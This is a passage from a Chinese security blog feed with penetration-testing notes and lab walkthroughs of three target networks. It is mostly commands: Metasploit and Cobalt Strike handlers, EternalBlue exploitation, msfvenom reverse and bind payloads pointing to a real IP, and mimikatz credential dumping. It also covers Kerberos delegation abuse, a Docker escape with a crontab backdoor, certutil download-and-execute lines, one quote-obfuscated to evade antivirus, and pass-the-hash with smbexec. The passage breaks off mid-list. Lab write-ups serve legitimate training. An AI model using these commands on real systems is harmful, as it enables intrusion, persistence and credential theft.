class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">载入～/.bash_profile, 设置为全局</span></span><br><span class=\"line\">export PATH=$PATH:[order location]</span><br></pre></td></tr></table></figure>\n<h3 id=\"win-install-mingw\"><a class=\"markdownIt-Anchor\" href=\"#win-install-mingw\">#</a> win install mingw</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">安装mingw包管理器：</span></span><br><span class=\"line\">https://osdn.net/projects/mingw/downloads/68260/mingw-get-setup.exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">装C、C++编译器：从 mingw-get 窗口左上角的安装菜单中选择应用更改</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">检验安装是否成功：</span></span><br><span class=\"line\">C:\\MinGW\\bin\\gcc.exe --version; C:\\MinGW\\bin\\g++.exe --version</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置路径为全局路径:</span> </span><br><span class=\"line\">C:\\MinGW\\bin\\</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">注意：g++会把.c和.cpp文件当作是C++的源程序进行编译；gcc会把.c当作是C源程序编译，.cpp的程序当作是C++源程序编译</span></span><br><span class=\"line\">gcc test.c -o test; g++ test.c -o 1</span><br></pre></td></tr></table></figure>\n<h3 id=\"msf中路由设置\"><a class=\"markdownIt-Anchor\" href=\"#msf中路由设置\">#</a> msf 中路由设置</h3>\n<p>路由添加</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看路由信息</span></span><br><span class=\"line\">run autoroute -p</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">添加路由</span></span><br><span class=\"line\">run post/multi/manage/autoroute</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">添加指定路由， 1 是接收的session编号：</span></span><br><span class=\"line\">route add 192.168.11.0 255.255.255.0 1</span><br></pre></td></tr></table></figure>\n<p>Sock 代理</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use auxiliary/server/socks_proxy</span><br><span class=\"line\">set srvhost 0.0.0.0</span><br><span class=\"line\">set srvport 1115 在外网服务器端口做了代理</span><br><span class=\"line\">run</span><br><span class=\"line\">vim /etc/proxychains外网服务器通过代理端口可以直接访问内网资产</span><br></pre></td></tr></table></figure>\n<h3 id=\"防火墙规则设置\"><a class=\"markdownIt-Anchor\" href=\"#防火墙规则设置\">#</a> 防火墙规则设置</h3>\n<ul>\n<li>Windows 防火墙命令：</li>\n</ul>\n<p>链接: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdG9tdGVsbHlvdS9wLzE2MzAwNTU3Lmh0bWw=\">https://www.cnblogs.com/tomtellyou/p/16300557.html</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看当前防火墙状态</span></span><br><span class=\"line\">netsh advfirewall show allprofiles</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">关闭防火墙</span></span><br><span class=\"line\">netsh advfirewall set allprofiles state off</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">开启防火墙</span></span><br><span class=\"line\">netsh advfirewall set allprofiles state on</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">恢复初始防火墙设置</span></span><br><span class=\"line\">netsh advfirewall reset</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">启用桌面防火墙</span></span><br><span class=\"line\">netsh advfirewall set allprofiles state on</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置默认输入和输出策略</span></span><br><span class=\"line\">netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如果设置为拒绝使用blockinbound,blockoutbound</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>iptables 规则设置</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"> /* 清除所有规则 */</span></span><br><span class=\"line\">iptables -F</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">/*允许包从 22 端口进入*/</span></span><br><span class=\"line\">iptables -A INPUT -p tcp --dport 22 -j ACCEPT </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">允许从 22 端口进入的包返回*/</span></span><br><span class=\"line\">iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT /*</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">/* 域名解析端口，一般不开 */</span></span><br><span class=\"line\">iptables -A OUTPUT -p udp --dport 53 -j ACCEPT </span><br><span class=\"line\">iptables -A INPUT -p udp --sport 53 -j ACCEPT </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">/*允许本机访问本机*/</span></span><br><span class=\"line\">iptables -A INPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT </span><br><span class=\"line\">iptables -A OUTPUT -s 127.0.0.1 -d 127.0.0.1 -j ACCEPT</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">/*允许所有IP访问 80 端口*/</span></span><br><span class=\"line\">iptables -A INPUT -p tcp -s 0/0 --dport 80 -j ACCEPT </span><br><span class=\"line\">iptables -A OUTPUT -p tcp --sport 80 -m state --state ESTABLISHED -j ACCEPT</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">/*保存配置*/</span></span><br><span class=\"line\">iptables-save &gt; /etc/sysconfig/iptables </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">/* 显示iptables列表 */</span></span><br><span class=\"line\">iptables -L </span><br></pre></td></tr></table></figure>\n<h3 id=\"cs上线linux\"><a class=\"markdownIt-Anchor\" href=\"#cs上线linux\">#</a> cs 上线 linux</h3>\n<p>项目位置：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dsb3hlYy9Dcm9zc0My\">https://github.com/gloxec/CrossC2</span><br>\n 使用参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9nbG94ZWMuZ2l0aHViLmlvL0Nyb3NzQzIvemhfY24v\">https://gloxec.github.io/CrossC2/zh_cn/</span></p>\n<p>目前版本只支持反向的 https 和正向的 tcp，下载对应版本加载器和 CNA 插件、上传加载器文件和本地加载 CNA 插件、修改 CNA 插件配置路径及上传 Key 文件、使用命令或插件绑定 HTTPS 监听器生成。</p>\n",
            "tags": [
                "渗透测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/",
            "url": "http://www.n1h1l157.live/2022/12/30/SAFE/13%20%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86/",
            "title": "XD22 13 补充知识",
            "date_published": "2022-12-29T16:00:00.000Z",
            "content_html": "<h3 id=\"vpc项目\"><a class=\"markdownIt-Anchor\" href=\"#vpc项目\">#</a> vpc 项目</h3>\n<h4 id=\"vpc1\"><a class=\"markdownIt-Anchor\" href=\"#vpc1\">#</a> vpc1</h4>\n<p><img data-src=\"/N1h1l157/Safe/image-003.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">通过 web 漏洞拿到 web 服务器的权限，用后门工具连接后，上传 cs 的马进 行上线。</span><br><span class=\"line\"></span><br><span class=\"line\">对 web 服务器进行域内信息收集，端口扫描，mimikatz 运行，导出部分凭 据和明文。设置代理转发端口，利用 proxychains 代理流量并用 CrackMapExec 工具进行域用户和本地用户的密码喷射，得到 windows 7 的本地用户权限，通 过端口转发上线此台机器。win7 的域用户 hash 和明文进行喷射时发现没有效果。</span><br><span class=\"line\"></span><br><span class=\"line\">在 windows7 上进行 spn 扫描，识别到了 mssql 服务器，利用注册表命令对 navicat 进行密码的读取并利用工具解密得到 mssql 的数据库密码。在主机上通 过 MDUT 与 proxifer 建立的规则连接到获取到密码的 mssql，开启 xpcmdshell 并 上传木马至服务器，执行成功之后获取到了 windows2008 的主机权限。</span><br><span class=\"line\"></span><br><span class=\"line\">对拿到的 2008 再次进行 mimikaz 导出明文，设置代理规则，用获取到的明 文依次进行域用户和本地用户登录，最终得到域控权限。</span><br></pre></td></tr></table></figure>\n<p>（ 1 ）上线 msf<br>\n 控制 weblogic 之后，先 sleep 0 ，其次进行网卡内存活主机扫描，判断存在 445 端口开放的主机；设置 socket 转发通过 fscan 进行内网扫描，识别到 ms17_010。检测到漏洞之后，将权限转发给 msf，由 msf 进行攻击。</p>\n<p>（ 2 ）将权限从 cs 转发至 msf<br>\ncs 配置 forigen http 的监听器，并命名为 msf<br>\n 主机移交监听器至 msf：spawn msf</p>\n<p>（ 3 ）MSF 监听联动配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set payload windows/meterpreter/reverse_http</span><br><span class=\"line\">set lhost 0.0.0.0</span><br><span class=\"line\">set lport xxxx</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p>（ 4 ）msf 添加路由</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">run autoroute -p # 查看当前路由表</span><br><span class=\"line\">run post/multi/manage/autoroute # 添加当前路由表</span><br></pre></td></tr></table></figure>\n<p>（ 5 ）利用模块</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class=\"line\">set payload windows/x64/meterpreter/bind_tcp # 正向连接上线</span><br><span class=\"line\">set rhost 10.10.20.7 # 设置连接目标</span><br><span class=\"line\">set rhosts 10.10.20.7 # 设置扫描目标</span><br><span class=\"line\">run</span><br></pre></td></tr></table></figure>\n<p>（ 6 ）获取 win7 的权限之后需再次设置路由</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">run autoroute -p # 查看当前路由表</span><br><span class=\"line\">run post/multi/manage/autoroute # 添加当前路由表</span><br></pre></td></tr></table></figure>\n<p>（ 7 ）将权限从 msf 转发至 cs<br>\n 设置 windows/beacon_bind_tcp 的监听器，生成此监听器的木马</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将木马上传到服务器，通过msf命令将木马发送到肉机</span></span><br><span class=\"line\">upload /root/bb.exe c:\\\\bb.exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">cs连接正向执行的木马：</span></span><br><span class=\"line\">connect 10.10.20.7</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">判断是否在域环境及获取域控ip</span></span><br><span class=\"line\">net user /domain</span><br></pre></td></tr></table></figure>\n<p>（ 8 ）读取明文密码和 hash<br>\ngetsystem 提升权限至 system，并运行 mimikatza 读取密码，cs 的操作为直接通过插件，msf 的操作为 load kiwi，creds_all 进行读取。</p>\n<p>（ 9 ）查找域内非约束委派用户和计算机</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置代理或者上传adfind工具来进行扫描</span></span><br><span class=\"line\">AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>\n<p>（ 10 ）对存在约束委派的 sqlserver 攻击</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">端口扫描识别存在约束委派的机器</span></span><br><span class=\"line\">fscan -h 10.10.10.18</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">攻击域内数据库主机：Proxifier设置整个网段的代理规则</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">弱口令扫描sqlserver机器：随便选去一个工具进行弱口令检测</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">MDUT攻击数据库：通过账户密码连接到sqlserver服务器，上传正向木马并执行（正向木马是绑定在了肉机自己的端口上，用cs连接此ip的端口可以上线）</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">cs连接sqlserver：</span></span><br><span class=\"line\">connect 10.10.10.18 2222</span><br></pre></td></tr></table></figure>\n<p>（ 11 ）提权并进行 mimikza 导出<br>\n用 10.10.20.x 的 win 7 机器进行转发上线，设置监听为 10.10.10.7，进行反向连接设置，对拿到的 mssql 的机器进行权限提升并选择监听器为 10.10.10.7 上开通的监听。以管理员权限运行 mimikza 进行明文密码和 hash 的导出。</p>\n<p>（ 12 ）通过 mssql 用户以约束委派方式攻击域控主机<br>\n建立代理或者上传 kekeo 工具进行票据操作</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">kekeo请求获取sqlserver的TGT：</span></span><br><span class=\"line\">kekeo &quot;tgt::ask /user:sqlserver /domain:redteam.red/passwor d:Server12345 /ticket:administrator.kirbi&quot; &quot;exit&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用票据请求域控：</span></span><br><span class=\"line\">kekeo &quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red @REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot; &quot;exit&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">导入内存：</span></span><br><span class=\"line\">mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~o wa.redteam.red@REDTEAM.RED.kirbi</span><br></pre></td></tr></table></figure>\n<p>（ 13 ）上线域控<br>\n连接域控： <code>dir \\\\OWA\\\\c$</code> <br>\n 通过命令上传木马并执行上线域控，也可以用 psexec 等工具上线域控</p>\n<h4 id=\"vpc2\"><a class=\"markdownIt-Anchor\" href=\"#vpc2\">#</a> vpc2</h4>\n<p><img data-src=\"/N1h1l157/Safe/image-004.png\" alt></p>\n<p>（ 1 ）web 服务器 linux 权限获取<br>\n web 上的 url 地址显示 login;jsessionid，抓包可以得到 remember me 的字段，<br>\n判断出是 shiro 框架，直接用 shiro 反序列化工具攻击，通过此工具植入哥斯拉 的内存马，用哥斯拉上线此台机器。</p>\n<p>对此机器进行审查，查看到有 dockerenv 的文件，从而判断出当前正处于 d ocker 内，需要进行 docker 逃逸</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">采用 https://cloud.tencent.com/developer/article/1987725 中的挂载方法进行逃逸。</span></span><br><span class=\"line\">fdisk -l &amp; mkdir xiaodi &amp; mount /dev/vda1 xiaodi/ &amp; chroot /xiaodi/</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">攻击 linux 常用 msf，准备 msf 的 elf 木马如下，生成之后将木马通过哥斯拉 上传到 docker 容器中，在从 docker 容器挂载的目录复制到/root 目录下。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">同时 msf 开启监听，等待木马执行之后的回联。</span></span><br><span class=\"line\">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=47.94.236.117 LPO RT=3333 -f elf &gt; shell.elf</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">修改计划任务设置木马执行的时间</span></span><br><span class=\"line\">chmod +x /xiaodi/root/shell.elf</span><br><span class=\"line\">echo &#x27;*/1 * * * * root /root/shell.elf&#x27; &gt;&gt; /xiaodi/etc/crontab 等待特定时间后成功上线 linux</span><br></pre></td></tr></table></figure>\n<p>（ 2 ）windows 2012 权限获取<br>\n通过 msf 添加路由的方式自动添加路由，对 1 网段进行扫描，获取到存活主机 1.16 与 1.10，并且在 16 地址上存在 web 服务，通过 msf 设置代理规则将内网服务映射到服务器上，利用 proxychains 在外网上访问内网服务。构造 http://192.168.1.16/?num []=1 进行绕过，并且得到了主机凭据 {Administrator / Admin1234567}。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">批量对域用户和本地用户进行凭据测试，判断出此凭据属于 win 2012 的本地用户。</span></span><br><span class=\"line\">proxychains python cme smb 192.168.1.10- 16 - u administrator -p &#x27;Admin1234567&#x27; --local-auth</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">win 2012 设置有防止流量出站的防火墙规则，采用正向连接的木马绕过此限制，若不知道网络情况的话需要反向正向都进行测试，命令如下。</span></span><br><span class=\"line\">msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=5555 - f exe &gt; bd.exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">因win 2012 不出网，故将木马上传至linux跳板机，在跳板机上用python开启简易web服务，</span></span><br><span class=\"line\">python -m SimpleHTTPServer。</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">并利用CrackMapExec直接在win 2012 上执行下载木马并且运行的木马，同时对特定端口进行正向监听，等待shell的回连。</span></span><br><span class=\"line\">proxychains python cme smb 192.168.1.16 -u administrator -p &#x27;Admin1234567&#x27; -x &#x27;cmd.exe /c certutil -urlcache -split -f [http://192.168.1.14:8000/bd.exe](http://192.168.1.14:8000/bd.exe) c:/bd.exe &amp; c:/bd.exe&#x27; --local-auth</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">此时成功获取到了win 2012 的权限。</span></span><br></pre></td></tr></table></figure>\n<p>（ 3 ）dc 权限获取</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在win 2012 进行mimikatz kiwi的攻击从而获取到登录过此主机的历史<span class=\"built_in\">hash</span>，成功获取到一个xiaodisec用户的<span class=\"built_in\">hash</span>值。测试此<span class=\"built_in\">hash</span>值与dc的通信。</span></span><br><span class=\"line\">proxychains python cme smb 192.168.1.10 -u administrator -H hash</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">发现此<span class=\"built_in\">hash</span>值就是dc的凭据，接下来就是利用此<span class=\"built_in\">hash</span>进行木马下载，上传木马至dc，并突破火绒的限制，拿到dc的权限。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过msf生成hex的木马，撰写go脚本实现命令拼接式的无文件落地的免杀exe。并通过同样的方法将命令放在linux上开启的简易web上。</span></span><br><span class=\"line\">msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=127.0.0.1 LPORT=6666 - f hex</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用CrackMapExec执行普通的命令执行时都会被视为威胁无法成功，通过如下的方式绕过火绒的检测，从linux上获取到木马并执行。</span></span><br><span class=\"line\">&quot;c&quot;&quot;e&quot;&quot;r&quot;&quot;t&quot;&quot;u&quot;&quot;t&quot;&quot;i&quot;&quot;l&quot; -&quot;u&quot;&quot;r&quot;&quot;l&quot;&quot;c&quot;&quot;a&quot;&quot;c&quot;&quot;h&quot;&quot;e&quot; -split -f [http://192.168.1.14:](http://192.168.1.14:)8000/5.exe c:/5.exe</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">下载仍然是失败的，在此情况下，使用交互式方案下载木马，具体命令如下。</span></span><br><span class=\"line\">proxychains python smbexec.py -hashes :f1065013e55bbbeb64ddab768229710d xiaodi/administrator@192.168.1.10</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">以此方式打开的交互式 cmd，可以下载免杀木马并且执行成功上线。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">除了这种变异命令之外，还可以采用copy的方式，从域控上讲木马从linux上直接复制到其上，不过也是需要开启交互式的cmd进行木马的获取的。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">杀毒对外部的数据比较严格，对自己的数据比较宽松，可以生成票据从域控连接到域内主机，通过copy命令将exe木马从域内主机复制到域控上。</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"vpc3\"><a class=\"markdownIt-Anchor\" href=\"#vpc3\">#</a> vpc3</h4>\n<p><img data-src=\"/N1h1l157/Safe/image-005.png\" alt></p>\n<p>（ 1 ）靶场 1 - Web 攻防</p>\n<p>（ 2 ）靶机 2 - MS17010 漏洞</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">密码喷射尝试：（失败）（由于知道是工作组，所以不需要进行域登录，参数也要改）</span></span><br><span class=\"line\">proxychains python cme smb 192.168.2.128- 129 - u administrator -H 53bd9892cea6f1d9ffa8ac587ba3cba6 --local-auth</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">MS17010-MSF判断和利用</span></span><br><span class=\"line\">msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=47.94.236.117 LPORT=999 -f exe &gt; m.exe</span><br></pre></td></tr></table></figure>\n<p>检测：auxiliary/scanner/smb/smb_ms17_010<br>\n 利用：exploit/windows/smb/ms17_010_eternalblue</p>\n<p>（ 3 ）靶机 3 - 口令获取<br>\n密码喷射尝试：（成功）<br>\n直接 CS 插件移动获取成功</p>\n<p>（ 4 ）靶机 4 - 通过 weblogic 获取<br>\n密码喷射尝试：（失败）<br>\n探针端口 7001 开放 - Weblogic - 利用漏洞攻击 - 工具利用<br>\n上传 webshell-C:\\Oracle\\Middleware\\Oracle_Home\\user_projects\\domains\\base_domain\\servers\\AdminServer\\tmp_WL_internal\\bea_wls_internal\\9j4dqk\\war\\xiaodi.jsp<br>\n 上传后门（反向）- 防火墙开启（扫描的时候发现被阻止）<br>\n执行后门上线 CS</p>\n<p>（ 5 ）靶机 5<br>\n 利用靶机 4 的口令横向移动得到</p>\n<p>（ 6 